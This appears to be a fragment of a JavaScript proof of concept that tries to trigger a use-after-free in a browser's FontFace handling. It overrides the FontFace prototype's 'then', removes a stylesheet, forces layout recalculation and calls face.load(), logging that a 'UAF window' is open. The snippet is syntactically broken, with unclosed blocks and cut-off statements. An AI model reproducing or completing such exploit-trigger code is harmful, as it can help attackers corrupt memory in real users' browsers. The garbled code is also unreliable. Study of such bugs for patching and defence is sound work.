    face.loaded; // Trigger internal promise

    Object.defineProperty(FontFace.prototype, 'then', {

            document.getElementById('v').remove();
            document.body.offsetHeight; // Force recalculation
            L("[+] Stylesheet removed. UAF window open.");

    try {
        L("[*] Calling face.load()...");
        face.load();
        L("[*] face.load() returned. If it didn't crash, UAF might have occurred silently.");
